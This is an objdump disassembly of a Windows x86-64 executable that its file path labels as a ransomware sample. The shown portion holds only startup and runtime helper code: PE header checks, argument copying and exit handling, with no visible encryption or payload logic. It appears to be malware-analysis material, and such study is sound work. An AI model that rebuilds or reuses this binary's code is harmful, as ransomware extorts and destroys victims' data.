
malware_samples/ransomware/6d189ef2bdcd62b389018913bd971f4c8e47a8349fa9101935dfebfcb69a5e06.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140001000 <.text>:
   140001000:	c3                   	ret
   140001001:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140001008:	00 00 00 00 
   14000100c:	0f 1f 40 00          	nopl   0x0(%rax)
   140001010:	41 57                	push   %r15
   140001012:	41 56                	push   %r14
   140001014:	41 55                	push   %r13
   140001016:	41 54                	push   %r12
   140001018:	55                   	push   %rbp
   140001019:	57                   	push   %rdi
   14000101a:	56                   	push   %rsi
   14000101b:	53                   	push   %rbx
   14000101c:	48 83 ec 58          	sub    $0x58,%rsp
   140001020:	b8 30 00 00 00       	mov    $0x30,%eax
   140001025:	65 67 48 8b 00       	mov    %gs:(%eax),%rax
   14000102a:	48 8b 70 08          	mov    0x8(%rax),%rsi
   14000102e:	48 8b 1d 3b b7 86 00 	mov    0x86b73b(%rip),%rbx        # 0x14086c770
   140001035:	48 8b 3d 4c 35 87 00 	mov    0x87354c(%rip),%rdi        # 0x140874588
   14000103c:	eb 12                	jmp    0x140001050
   14000103e:	66 90                	xchg   %ax,%ax
   140001040:	48 39 c6             	cmp    %rax,%rsi
   140001043:	0f 84 b7 00 00 00    	je     0x140001100
   140001049:	b9 e8 03 00 00       	mov    $0x3e8,%ecx
   14000104e:	ff d7                	call   *%rdi
   140001050:	31 c0                	xor    %eax,%eax
   140001052:	f0 48 0f b1 33       	lock cmpxchg %rsi,(%rbx)
   140001057:	75 e7                	jne    0x140001040
   140001059:	45 31 f6             	xor    %r14d,%r14d
   14000105c:	48 8b 2d 1d b7 86 00 	mov    0x86b71d(%rip),%rbp        # 0x14086c780
   140001063:	8b 45 00             	mov    0x0(%rbp),%eax
   140001066:	83 f8 01             	cmp    $0x1,%eax
   140001069:	0f 84 59 03 00 00    	je     0x1400013c8
   14000106f:	8b 45 00             	mov    0x0(%rbp),%eax
   140001072:	85 c0                	test   %eax,%eax
   140001074:	0f 84 96 00 00 00    	je     0x140001110
   14000107a:	c7 05 80 1f 87 00 01 	movl   $0x1,0x871f80(%rip)        # 0x140873004
   140001081:	00 00 00 
   140001084:	45 85 f6             	test   %r14d,%r14d
   140001087:	0f 84 9b 02 00 00    	je     0x140001328
   14000108d:	48 8b 05 3c b6 86 00 	mov    0x86b63c(%rip),%rax        # 0x14086c6d0
   140001094:	48 8b 00             	mov    (%rax),%rax
   140001097:	48 85 c0             	test   %rax,%rax
   14000109a:	74 0c                	je     0x1400010a8
   14000109c:	45 31 c0             	xor    %r8d,%r8d
   14000109f:	ba 02 00 00 00       	mov    $0x2,%edx
   1400010a4:	31 c9                	xor    %ecx,%ecx
   1400010a6:	ff d0                	call   *%rax
   1400010a8:	e8 13 0e 04 00       	call   0x140041ec0
   1400010ad:	4c 8b 05 5c 1f 87 00 	mov    0x871f5c(%rip),%r8        # 0x140873010
   1400010b4:	8b 0d 66 1f 87 00    	mov    0x871f66(%rip),%ecx        # 0x140873020
   1400010ba:	4c 89 00             	mov    %r8,(%rax)
   1400010bd:	48 8b 15 54 1f 87 00 	mov    0x871f54(%rip),%rdx        # 0x140873018
   1400010c4:	e8 97 13 00 00       	call   0x140002460
   1400010c9:	8b 0d 39 1f 87 00    	mov    0x871f39(%rip),%ecx        # 0x140873008
   1400010cf:	85 c9                	test   %ecx,%ecx
   1400010d1:	0f 84 fb 02 00 00    	je     0x1400013d2
   1400010d7:	8b 15 27 1f 87 00    	mov    0x871f27(%rip),%edx        # 0x140873004
   1400010dd:	85 d2                	test   %edx,%edx
   1400010df:	0f 84 2b 02 00 00    	je     0x140001310
   1400010e5:	48 83 c4 58          	add    $0x58,%rsp
   1400010e9:	5b                   	pop    %rbx
   1400010ea:	5e                   	pop    %rsi
   1400010eb:	5f                   	pop    %rdi
   1400010ec:	5d                   	pop    %rbp
   1400010ed:	41 5c                	pop    %r12
   1400010ef:	41 5d                	pop    %r13
   1400010f1:	41 5e                	pop    %r14
   1400010f3:	41 5f                	pop    %r15
   1400010f5:	c3                   	ret
   1400010f6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   1400010fd:	00 00 00 
   140001100:	41 be 01 00 00 00    	mov    $0x1,%r14d
   140001106:	e9 51 ff ff ff       	jmp    0x14000105c
   14000110b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001110:	c7 45 00 01 00 00 00 	movl   $0x1,0x0(%rbp)
   140001117:	e8 e4 12 04 00       	call   0x140042400
   14000111c:	48 8d 0d bd 16 04 00 	lea    0x416bd(%rip),%rcx        # 0x1400427e0
   140001123:	ff 15 57 34 87 00    	call   *0x873457(%rip)        # 0x140874580
   140001129:	48 8b 15 30 b6 86 00 	mov    0x86b630(%rip),%rdx        # 0x14086c760
   140001130:	48 8d 0d c9 fe ff ff 	lea    -0x137(%rip),%rcx        # 0x140001000
   140001137:	48 89 02             	mov    %rax,(%rdx)
   14000113a:	e8 a1 0d 04 00       	call   0x140041ee0
   14000113f:	e8 fc 1a 04 00       	call   0x140042c40
   140001144:	48 8b 05 e5 b5 86 00 	mov    0x86b5e5(%rip),%rax        # 0x14086c730
   14000114b:	31 c9                	xor    %ecx,%ecx
   14000114d:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   140001153:	48 8b 05 e6 b5 86 00 	mov    0x86b5e6(%rip),%rax        # 0x14086c740
   14000115a:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   140001160:	48 8b 05 e9 b5 86 00 	mov    0x86b5e9(%rip),%rax        # 0x14086c750
   140001167:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   14000116d:	48 8b 05 2c b5 86 00 	mov    0x86b52c(%rip),%rax        # 0x14086c6a0
   140001174:	66 81 38 4d 5a       	cmpw   $0x5a4d,(%rax)
   140001179:	75 45                	jne    0x1400011c0
   14000117b:	48 63 50 3c          	movslq 0x3c(%rax),%rdx
   14000117f:	48 01 d0             	add    %rdx,%rax
   140001182:	81 38 50 45 00 00    	cmpl   $0x4550,(%rax)
   140001188:	75 36                	jne    0x1400011c0
   14000118a:	0f b7 50 18          	movzwl 0x18(%rax),%edx
   14000118e:	66 81 fa 0b 01       	cmp    $0x10b,%dx
   140001193:	0f 84 11 02 00 00    	je     0x1400013aa
   140001199:	66 81 fa 0b 02       	cmp    $0x20b,%dx
   14000119e:	75 20                	jne    0x1400011c0
   1400011a0:	83 b8 84 00 00 00 0e 	cmpl   $0xe,0x84(%rax)
   1400011a7:	76 17                	jbe    0x1400011c0
   1400011a9:	44 8b 88 f8 00 00 00 	mov    0xf8(%rax),%r9d
   1400011b0:	31 c9                	xor    %ecx,%ecx
   1400011b2:	45 85 c9             	test   %r9d,%r9d
   1400011b5:	0f 95 c1             	setne  %cl
   1400011b8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1400011bf:	00 
   1400011c0:	48 8b 05 59 b5 86 00 	mov    0x86b559(%rip),%rax        # 0x14086c720
   1400011c7:	89 0d 3b 1e 87 00    	mov    %ecx,0x871e3b(%rip)        # 0x140873008
   1400011cd:	44 8b 00             	mov    (%rax),%r8d
   1400011d0:	45 85 c0             	test   %r8d,%r8d
   1400011d3:	0f 85 5f 01 00 00    	jne    0x140001338
   1400011d9:	b9 01 00 00 00       	mov    $0x1,%ecx
   1400011de:	e8 35 0d 04 00       	call   0x140041f18
   1400011e3:	e8 b8 0c 04 00       	call   0x140041ea0
   1400011e8:	48 8b 15 01 b6 86 00 	mov    0x86b601(%rip),%rdx        # 0x14086c7f0
   1400011ef:	8b 12                	mov    (%rdx),%edx
   1400011f1:	89 10                	mov    %edx,(%rax)
   1400011f3:	e8 b8 0c 04 00       	call   0x140041eb0
   1400011f8:	48 8b 15 d1 b5 86 00 	mov    0x86b5d1(%rip),%rdx        # 0x14086c7d0
   1400011ff:	8b 12                	mov    (%rdx),%edx
   140001201:	89 10                	mov    %edx,(%rax)
   140001203:	e8 68 0e 04 00       	call   0x140042070
   140001208:	85 c0                	test   %eax,%eax
   14000120a:	0f 88 f1 00 00 00    	js     0x140001301
   140001210:	48 8b 05 69 b4 86 00 	mov    0x86b469(%rip),%rax        # 0x14086c680
   140001217:	83 38 01             	cmpl   $0x1,(%rax)
   14000121a:	0f 84 79 01 00 00    	je     0x140001399
   140001220:	48 8b 05 b9 b4 86 00 	mov    0x86b4b9(%rip),%rax        # 0x14086c6e0
   140001227:	83 38 ff             	cmpl   $0xffffffff,(%rax)
   14000122a:	0f 84 5a 01 00 00    	je     0x14000138a
   140001230:	48 8b 15 89 b5 86 00 	mov    0x86b589(%rip),%rdx        # 0x14086c7c0
   140001237:	48 8b 0d 72 b5 86 00 	mov    0x86b572(%rip),%rcx        # 0x14086c7b0
   14000123e:	e8 1d 0c 04 00       	call   0x140041e60
   140001243:	85 c0                	test   %eax,%eax
   140001245:	0f 85 35 01 00 00    	jne    0x140001380
   14000124b:	48 8b 05 ae b5 86 00 	mov    0x86b5ae(%rip),%rax        # 0x14086c800
   140001252:	4c 8d 05 b7 1d 87 00 	lea    0x871db7(%rip),%r8        # 0x140873010
   140001259:	48 8d 15 b8 1d 87 00 	lea    0x871db8(%rip),%rdx        # 0x140873018
   140001260:	48 8d 0d b9 1d 87 00 	lea    0x871db9(%rip),%rcx        # 0x140873020
   140001267:	8b 00                	mov    (%rax),%eax
   140001269:	89 44 24 4c          	mov    %eax,0x4c(%rsp)
   14000126d:	48 8b 05 6c b5 86 00 	mov    0x86b56c(%rip),%rax        # 0x14086c7e0
   140001274:	44 8b 08             	mov    (%rax),%r9d
   140001277:	48 8d 44 24 4c       	lea    0x4c(%rsp),%rax
   14000127c:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140001281:	e8 8a 0c 04 00       	call   0x140041f10
   140001286:	85 c0                	test   %eax,%eax
   140001288:	78 77                	js     0x140001301
   14000128a:	4c 63 25 8f 1d 87 00 	movslq 0x871d8f(%rip),%r12        # 0x140873020
   140001291:	41 8d 4c 24 01       	lea    0x1(%r12),%ecx
   140001296:	48 63 c9             	movslq %ecx,%rcx
   140001299:	48 c1 e1 03          	shl    $0x3,%rcx
   14000129d:	e8 ae 0c 04 00       	call   0x140041f50
   1400012a2:	49 89 c5             	mov    %rax,%r13
   1400012a5:	48 85 c0             	test   %rax,%rax
   1400012a8:	74 57                	je     0x140001301
   1400012aa:	45 85 e4             	test   %r12d,%r12d
   1400012ad:	0f 8e 99 00 00 00    	jle    0x14000134c
   1400012b3:	4c 8b 3d 5e 1d 87 00 	mov    0x871d5e(%rip),%r15        # 0x140873018
   1400012ba:	be 01 00 00 00       	mov    $0x1,%esi
   1400012bf:	eb 20                	jmp    0x1400012e1
   1400012c1:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   1400012c8:	49 8b 54 f7 f8       	mov    -0x8(%r15,%rsi,8),%rdx
   1400012cd:	49 89 f8             	mov    %rdi,%r8
   1400012d0:	48 89 c1             	mov    %rax,%rcx
   1400012d3:	e8 88 0c 04 00       	call   0x140041f60
   1400012d8:	49 39 f4             	cmp    %rsi,%r12
   1400012db:	74 6a                	je     0x140001347
   1400012dd:	48 83 c6 01          	add    $0x1,%rsi
   1400012e1:	49 8b 4c f7 f8       	mov    -0x8(%r15,%rsi,8),%rcx
   1400012e6:	e8 8d 0c 04 00       	call   0x140041f78
   1400012eb:	48 8d 78 01          	lea    0x1(%rax),%rdi
   1400012ef:	48 89 f9             	mov    %rdi,%rcx
   1400012f2:	e8 59 0c 04 00       	call   0x140041f50
   1400012f7:	49 89 44 f5 f8       	mov    %rax,-0x8(%r13,%rsi,8)
   1400012fc:	48 85 c0             	test   %rax,%rax
   1400012ff:	75 c7                	jne    0x1400012c8
   140001301:	b9 08 00 00 00       	mov    $0x8,%ecx
   140001306:	e8 15 0c 04 00       	call   0x140041f20
   14000130b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001310:	89 44 24 3c          	mov    %eax,0x3c(%rsp)
   140001314:	e8 0f 0c 04 00       	call   0x140041f28
   140001319:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   14000131d:	e9 c3 fd ff ff       	jmp    0x1400010e5
   140001322:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140001328:	31 c0                	xor    %eax,%eax
   14000132a:	48 87 03             	xchg   %rax,(%rbx)
   14000132d:	e9 5b fd ff ff       	jmp    0x14000108d
   140001332:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140001338:	b9 02 00 00 00       	mov    $0x2,%ecx
   14000133d:	e8 d6 0b 04 00       	call   0x140041f18
   140001342:	e9 9c fe ff ff       	jmp    0x1400011e3
   140001347:	4b 8d 44 e5 00       	lea    0x0(%r13,%r12,8),%rax
   14000134c:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
   140001353:	48 8b 15 46 b4 86 00 	mov    0x86b446(%rip),%rdx        # 0x14086c7a0
   14000135a:	48 8b 0d 2f b4 86 00 	mov    0x86b42f(%rip),%rcx        # 0x14086c790
   140001361:	4c 89 2d b0 1c 87 00 	mov    %r13,0x871cb0(%rip)        # 0x140873018
   140001368:	e8 c3 0b 04 00       	call   0x140041f30
   14000136d:	e8 de 0c 04 00       	call   0x140042050
   140001372:	c7 45 00 02 00 00 00 	movl   $0x2,0x0(%rbp)
   140001379:	e9 06 fd ff ff       	jmp    0x140001084
   14000137e:	66 90                	xchg   %ax,%ax
   140001380:	b8 ff 00 00 00       	mov    $0xff,%eax
   140001385:	e9 5b fd ff ff       	jmp    0x1400010e5
   14000138a:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
   14000138f:	e8 5c 0b 04 00       	call   0x140041ef0
   140001394:	e9 97 fe ff ff       	jmp    0x140001230
   140001399:	48 8d 0d 90 0d 04 00 	lea    0x40d90(%rip),%rcx        # 0x140042130
   1400013a0:	e8 2b 14 04 00       	call   0x1400427d0
   1400013a5:	e9 76 fe ff ff       	jmp    0x140001220
   1400013aa:	83 78 74 0e          	cmpl   $0xe,0x74(%rax)
   1400013ae:	0f 86 0c fe ff ff    	jbe    0x1400011c0
   1400013b4:	44 8b 90 e8 00 00 00 	mov    0xe8(%rax),%r10d
   1400013bb:	31 c9                	xor    %ecx,%ecx
   1400013bd:	45 85 d2             	test   %r10d,%r10d
   1400013c0:	0f 95 c1             	setne  %cl
   1400013c3:	e9 f8 fd ff ff       	jmp    0x1400011c0
   1400013c8:	b9 1f 00 00 00       	mov    $0x1f,%ecx
   1400013cd:	e8 4e 0b 04 00       	call   0x140041f20
   1400013d2:	89 c1                	mov    %eax,%ecx
   1400013d4:	e8 6f 0b 04 00       	call   0x140041f48
   1400013d9:	90                   	nop
   1400013da:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   1400013e0:	48 83 ec 28          	sub    $0x28,%rsp
   1400013e4:	48 8b 05 35 b3 86 00 	mov    0x86b335(%rip),%rax        # 0x14086c720
   1400013eb:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   1400013f1:	e8 1a fc ff ff       	call   0x140001010
   1400013f6:	90                   	nop
   1400013f7:	90                   	nop
   1400013f8:	48 83 c4 28          	add    $0x28,%rsp
   1400013fc:	c3                   	ret
   1400013fd:	0f 1f 00             	nopl   (%rax)
   140001400:	48 83 ec 28          	sub    $0x28,%rsp
   140001404:	48 8b 05 15 b3 86 00 	mov    0x86b315(%rip),%rax        # 0x14086c720
   14000140b:	c7 00 00 00 00 00    	movl   $0x0,(%rax)
   140001411:	e8 fa fb ff ff       	call   0x140001010
   140001416:	90                   	nop
   140001417:	90                   	nop
   140001418:	48 83 c4 28          	add    $0x28,%rsp
   14000141c:	c3                   	ret
   14000141d:	0f 1f 00             	nopl   (%rax)
   140001420:	e9 1b 0b 04 00       	jmp    0x140041f40
   140001425:	90                   	nop
   140001426:	90                   	nop
   140001427:	90                   	nop
   140001428:	90                   	nop
   140001429:	90                   	nop
   14000142a:	90                   	nop
   14000142b:	90                   	nop
   14000142c:	90                   	nop
   14000142d:	90                   	nop
   14000142e:	90                   	nop
   14000142f:	90                   	nop
   140001430:	48 8d 0d 09 00 00 00 	lea    0x9(%rip),%rcx        # 0x140001440
   140001437:	e9 e4 ff ff ff       	jmp    0x140001420
   14000143c:	0f 1f 40 00          	nopl   0x0(%rax)
   140001440:	c3                   	ret
   140001441:	90                   	nop
   140001442:	90                   	nop
   140001443:	90                   	nop
   140001444:	90                   	nop
   140001445:	90                   	nop
   140001446:	90                   	nop
   140001447:	90                   	nop
   140001448:	90                   	nop
   140001449:	90                   	nop
   14000144a:	90                   	nop
   14000144b:	90                   	nop
   14000144c:	90                   	nop
   14000144d:	90                   	nop
   14000144e:	90                   	nop
   14000144f:	90                   	nop
   140001450:	56                   	push   %rsi
   140001451:	48 83 ec 20          	sub    $0x20,%rsp
   140001455:	48 89 ce             	mov    %rcx,%rsi
   140001458:	b9 08 00 00 00       	mov    $0x8,%ecx
   14000145d:	e8 e4 04 00 00       	call   0x140001946
   140001462:	48 89 30             	mov    %rsi,(%rax)
   140001465:	48 8d 15 cc 5d 04 00 	lea    0x45dcc(%rip),%rdx        # 0x140047238
   14000146c:	48 83 c4 20          	add    $0x20,%rsp
   140001470:	5e                   	pop    %rsi
   140001471:	c3                   	ret
   140001472:	48 83 ec 48          	sub    $0x48,%rsp
   140001476:	48 8d 44 24 20       	lea    0x20(%rsp),%rax
   14000147b:	83 20 00             	andl   $0x0,(%rax)
   14000147e:	49 89 d0             	mov    %rdx,%r8
   140001481:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001484:	0f 11 40 08          	movups %xmm0,0x8(%rax)
   140001488:	c7 40 18 07 00 00 00 	movl   $0x7,0x18(%rax)
   14000148f:	48 83 60 1c 00       	andq   $0x0,0x1c(%rax)
   140001494:	48 89 ca             	mov    %rcx,%rdx
   140001497:	66 83 60 24 00       	andw   $0x0,0x24(%rax)
   14000149c:	b1 01                	mov    $0x1,%cl
   14000149e:	88 48 21             	mov    %cl,0x21(%rax)
   1400014a1:	88 48 24             	mov    %cl,0x24(%rax)
   1400014a4:	88 48 23             	mov    %cl,0x23(%rax)
   1400014a7:	48 89 c1             	mov    %rax,%rcx
   1400014aa:	e8 11 ab 02 00       	call   0x14002bfc0
   1400014af:	90                   	nop
   1400014b0:	48 83 c4 48          	add    $0x48,%rsp
   1400014b4:	c3                   	ret
   1400014b5:	41 57                	push   %r15
   1400014b7:	41 56                	push   %r14
   1400014b9:	41 54                	push   %r12
   1400014bb:	56                   	push   %rsi
   1400014bc:	57                   	push   %rdi
   1400014bd:	55                   	push   %rbp
   1400014be:	53                   	push   %rbx
   1400014bf:	48 83 ec 30          	sub    $0x30,%rsp
   1400014c3:	4c 89 c6             	mov    %r8,%rsi
   1400014c6:	48 89 d7             	mov    %rdx,%rdi
   1400014c9:	48 89 cb             	mov    %rcx,%rbx
   1400014cc:	4c 8d 74 24 28       	lea    0x28(%rsp),%r14
   1400014d1:	4c 8d 3d 28 3b 04 00 	lea    0x43b28(%rip),%r15        # 0x140045000
   1400014d8:	bd 2a 00 00 00       	mov    $0x2a,%ebp
   1400014dd:	4c 8d 25 44 7c 86 00 	lea    0x867c44(%rip),%r12        # 0x140869128
   1400014e4:	48 85 f6             	test   %rsi,%rsi
   1400014e7:	74 64                	je     0x14000154d
   1400014e9:	48 89 d9             	mov    %rbx,%rcx
   1400014ec:	48 89 fa             	mov    %rdi,%rdx
   1400014ef:	49 89 f0             	mov    %rsi,%r8
   1400014f2:	e8 99 e5 02 00       	call   0x14002fa90
   1400014f7:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400014fc:	48 89 54 24 28       	mov    %rdx,0x28(%rsp)
   140001501:	a8 01                	test   $0x1,%al
   140001503:	74 13                	je     0x140001518
   140001505:	89 d0                	mov    %edx,%eax
   140001507:	83 e0 03             	and    $0x3,%eax
   14000150a:	49 63 04 87          	movslq (%r15,%rax,4),%rax
   14000150e:	4c 01 f8             	add    %r15,%rax
   140001511:	ff e0                	jmp    *%rax
   140001513:	8a 42 10             	mov    0x10(%rdx),%al
   140001516:	eb 27                	jmp    0x14000153f
   140001518:	48 85 d2             	test   %rdx,%rdx
   14000151b:	74 34                	je     0x140001551
   14000151d:	48 89 f0             	mov    %rsi,%rax
   140001520:	48 29 d0             	sub    %rdx,%rax
   140001523:	72 41                	jb     0x140001566
   140001525:	48 01 d7             	add    %rdx,%rdi
   140001528:	48 89 c6             	mov    %rax,%rsi
   14000152b:	eb b7                	jmp    0x1400014e4
   14000152d:	8a 42 0f             	mov    0xf(%rdx),%al
   140001530:	eb 0d                	jmp    0x14000153f
   140001532:	48 89 d0             	mov    %rdx,%rax
   140001535:	48 c1 e8 20          	shr    $0x20,%rax
   140001539:	83 f8 2a             	cmp    $0x2a,%eax
   14000153c:	0f 43 c5             	cmovae %ebp,%eax
   14000153f:	3c 23                	cmp    $0x23,%al
   140001541:	75 11                	jne    0x140001554
   140001543:	4c 89 f1             	mov    %r14,%rcx
   140001546:	e8 6c 00 00 00       	call   0x1400015b7
   14000154b:	eb 97                	jmp    0x1400014e4
   14000154d:	31 d2                	xor    %edx,%edx
   14000154f:	eb 03                	jmp    0x140001554
   140001551:	4c 89 e2             	mov    %r12,%rdx
   140001554:	48 89 d0             	mov    %rdx,%rax
   140001557:	48 83 c4 30          	add    $0x30,%rsp
   14000155b:	5b                   	pop    %rbx
   14000155c:	5d                   	pop    %rbp
   14000155d:	5f                   	pop    %rdi
   14000155e:	5e                   	pop    %rsi
   14000155f:	41 5c                	pop    %r12
   140001561:	41 5e                	pop    %r14
   140001563:	41 5f                	pop    %r15
   140001565:	c3                   	ret
   140001566:	4c 8d 05 ab 5b 04 00 	lea    0x45bab(%rip),%r8        # 0x140047118
   14000156d:	48 89 d1             	mov    %rdx,%rcx
   140001570:	48 89 f2             	mov    %rsi,%rdx
   140001573:	e8 f8 22 00 00       	call   0x140003870
   140001578:	cc                   	int3
   140001579:	48 83 ec 28          	sub    $0x28,%rsp
   14000157d:	ff d1                	call   *%rcx
   14000157f:	90                   	nop
   140001580:	48 83 c4 28          	add    $0x28,%rsp
   140001584:	c3                   	ret
   140001585:	48 8b 01             	mov    (%rcx),%rax
   140001588:	48 8b 48 08          	mov    0x8(%rax),%rcx
   14000158c:	48 8b 40 10          	mov    0x10(%rax),%rax
   140001590:	4c 8b 02             	mov    (%rdx),%r8
   140001593:	4c 8b 4a 08          	mov    0x8(%rdx),%r9
   140001597:	48 89 c2             	mov    %rax,%rdx
   14000159a:	e9 81 1b 03 00       	jmp    0x140033120
   14000159f:	48 89 c8             	mov    %rcx,%rax
   1400015a2:	48 8b 09             	mov    (%rcx),%rcx
   1400015a5:	48 89 ca             	mov    %rcx,%rdx
   1400015a8:	48 f7 da             	neg    %rdx
   1400015ab:	71 01                	jno    0x1400015ae
   1400015ad:	c3                   	ret
   1400015ae:	48 8b 50 08          	mov    0x8(%rax),%rdx
   1400015b2:	e9 9a 61 00 00       	jmp    0x140007751
   1400015b7:	56                   	push   %rsi
   1400015b8:	57                   	push   %rdi
   1400015b9:	53                   	push   %rbx
   1400015ba:	48 83 ec 20          	sub    $0x20,%rsp
   1400015be:	48 8b 31             	mov    (%rcx),%rsi
   1400015c1:	89 f0                	mov    %esi,%eax
   1400015c3:	83 e0 03             	and    $0x3,%eax
   1400015c6:	48 8d 48 fe          	lea    -0x2(%rax),%rcx
   1400015ca:	48 83 f9 02          	cmp    $0x2,%rcx
   1400015ce:	72 05                	jb     0x1400015d5
   1400015d0:	48 85 c0             	test   %rax,%rax
   1400015d3:	75 08                	jne    0x1400015dd
   1400015d5:	48 83 c4 20          	add    $0x20,%rsp
   1400015d9:	5b                   	pop    %rbx
   1400015da:	5f                   	pop    %rdi
   1400015db:	5e                   	pop    %rsi
   1400015dc:	c3                   	ret
   1400015dd:	48 8b 7e ff          	mov    -0x1(%rsi),%rdi
   1400015e1:	48 8b 5e 07          	mov    0x7(%rsi),%rbx
   1400015e5:	48 8b 03             	mov    (%rbx),%rax
   1400015e8:	48 85 c0             	test   %rax,%rax
   1400015eb:	74 05                	je     0x1400015f2
   1400015ed:	48 89 f9             	mov    %rdi,%rcx
   1400015f0:	ff d0                	call   *%rax
   1400015f2:	48 ff ce             	dec    %rsi
   1400015f5:	48 83 7b 08 00       	cmpq   $0x0,0x8(%rbx)
   1400015fa:	74 0c                	je     0x140001608
   1400015fc:	48 8b 53 10          	mov    0x10(%rbx),%rdx
   140001600:	48 89 f9             	mov    %rdi,%rcx
   140001603:	e8 48 12 00 00       	call   0x140002850
   140001608:	ba 08 00 00 00       	mov    $0x8,%edx
   14000160d:	48 89 f1             	mov    %rsi,%rcx
   140001610:	48 83 c4 20          	add    $0x20,%rsp
   140001614:	5b                   	pop    %rbx
   140001615:	5f                   	pop    %rdi
   140001616:	5e                   	pop    %rsi
   140001617:	e9 34 12 00 00       	jmp    0x140002850
   14000161c:	41 57                	push   %r15
   14000161e:	41 56                	push   %r14
   140001620:	41 55                	push   %r13
   140001622:	41 54                	push   %r12
   140001624:	56                   	push   %rsi
   140001625:	57                   	push   %rdi
   140001626:	55                   	push   %rbp
   140001627:	53                   	push   %rbx
   140001628:	48 83 ec 38          	sub    $0x38,%rsp
   14000162c:	48 89 ce             	mov    %rcx,%rsi
   14000162f:	48 8b 09             	mov    (%rcx),%rcx
   140001632:	48 8b 56 08          	mov    0x8(%rsi),%rdx
   140001636:	e8 16 61 00 00       	call   0x140007751
   14000163b:	48 8b 7e 28          	mov    0x28(%rsi),%rdi
   14000163f:	48 8b 5e 30          	mov    0x30(%rsi),%rbx
   140001643:	4c 8d 77 10          	lea    0x10(%rdi),%r14
   140001647:	48 83 eb 01          	sub    $0x1,%rbx
   14000164b:	72 12                	jb     0x14000165f
   14000164d:	49 8b 4e f8          	mov    -0x8(%r14),%rcx
   140001651:	49 8b 16             	mov    (%r14),%rdx
   140001654:	e8 f8 60 00 00       	call   0x140007751
   140001659:	49 83 c6 28          	add    $0x28,%r14
   14000165d:	eb e8                	jmp    0x140001647
   14000165f:	48 8b 4e 20          	mov    0x20(%rsi),%rcx
   140001663:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   140001669:	41 b9 28 00 00 00    	mov    $0x28,%r9d
   14000166f:	48 89 fa             	mov    %rdi,%rdx
   140001672:	e8 fe 57 00 00       	call   0x140006e75
   140001677:	4c 8b 86 88 00 00 00 	mov    0x88(%rsi),%r8
   14000167e:	4d 89 c6             	mov    %r8,%r14
   140001681:	4d 85 c0             	test   %r8,%r8
   140001684:	0f 95 c0             	setne  %al
   140001687:	74 07                	je     0x140001690
   140001689:	4c 8b b6 98 00 00 00 	mov    0x98(%rsi),%r14
   140001690:	4c 8b be 90 00 00 00 	mov    0x90(%rsi),%r15
   140001697:	31 ff                	xor    %edi,%edi
   140001699:	48 8d 5c 24 20       	lea    0x20(%rsp),%rbx
   14000169e:	49 83 ee 01          	sub    $0x1,%r14
   1400016a2:	0f 82 dd 00 00 00    	jb     0x140001785
   1400016a8:	a8 01                	test   $0x1,%al
   1400016aa:	0f 84 64 01 00 00    	je     0x140001814
   1400016b0:	48 85 ff             	test   %rdi,%rdi
   1400016b3:	75 3d                	jne    0x1400016f2
   1400016b5:	4c 89 c7             	mov    %r8,%rdi
   1400016b8:	49 83 ef 01          	sub    $0x1,%r15
   1400016bc:	72 09                	jb     0x1400016c7
   1400016be:	48 8b bf d8 03 00 00 	mov    0x3d8(%rdi),%rdi
   1400016c5:	eb f1                	jmp    0x1400016b8
   1400016c7:	45 31 ff             	xor    %r15d,%r15d
   1400016ca:	45 31 c0             	xor    %r8d,%r8d
   1400016cd:	eb 23                	jmp    0x1400016f2
   1400016cf:	48 89 d9             	mov    %rbx,%rcx
   1400016d2:	48 89 fa             	mov    %rdi,%rdx
   1400016d5:	e8 1c 02 00 00       	call   0x1400018f6
   1400016da:	48 8b 7c 24 20       	mov    0x20(%rsp),%rdi
   1400016df:	48 85 ff             	test   %rdi,%rdi
   1400016e2:	0f 84 20 01 00 00    	je     0x140001808
   1400016e8:	4c 8b 44 24 28       	mov    0x28(%rsp),%r8
   1400016ed:	4c 8b 7c 24 30       	mov    0x30(%rsp),%r15
   1400016f2:	0f b7 87 d2 03 00 00 	movzwl 0x3d2(%rdi),%eax
   1400016f9:	49 39 c7             	cmp    %rax,%r15
   1400016fc:	73 d1                	jae    0x1400016cf
   1400016fe:	4d 8d 6f 01          	lea    0x1(%r15),%r13
   140001702:	4d 85 c0             	test   %r8,%r8
   140001705:	74 1f                	je     0x140001726
   140001707:	4a 8d 04 ef          	lea    (%rdi,%r13,8),%rax
   14000170b:	48 05 d8 03 00 00    	add    $0x3d8,%rax
   140001711:	4c 8b 20             	mov    (%rax),%r12
   140001714:	49 8d 84 24 d8 03 00 	lea    0x3d8(%r12),%rax
   14000171b:	00 
   14000171c:	49 ff c8             	dec    %r8
   14000171f:	75 f0                	jne    0x140001711
   140001721:	45 31 ed             	xor    %r13d,%r13d
   140001724:	eb 03                	jmp    0x140001729
   140001726:	49 89 fc             	mov    %rdi,%r12
   140001729:	49 6b ef 38          	imul   $0x38,%r15,%rbp
   14000172d:	49 c1 e7 05          	shl    $0x5,%r15
   140001731:	48 8b 8c 2f 68 01 00 	mov    0x168(%rdi,%rbp,1),%rcx
   140001738:	00 
   140001739:	48 8b 94 2f 70 01 00 	mov    0x170(%rdi,%rbp,1),%rdx
   140001740:	00 
   140001741:	e8 0b 60 00 00       	call   0x140007751
   140001746:	48 8b 8c 2f 88 01 00 	mov    0x188(%rdi,%rbp,1),%rcx
   14000174d:	00 
